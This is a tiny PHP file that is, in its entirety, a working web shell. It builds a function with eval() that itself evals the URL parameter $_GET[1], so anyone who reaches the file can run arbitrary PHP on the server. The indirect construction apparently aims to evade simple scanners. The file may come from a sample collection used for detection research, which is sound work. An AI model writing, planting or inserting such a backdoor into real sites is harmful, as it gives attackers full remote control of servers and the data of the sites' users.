<?php
    eval("function lambda_n() { eval($_GET[1]); }");
    lambda_n();
?>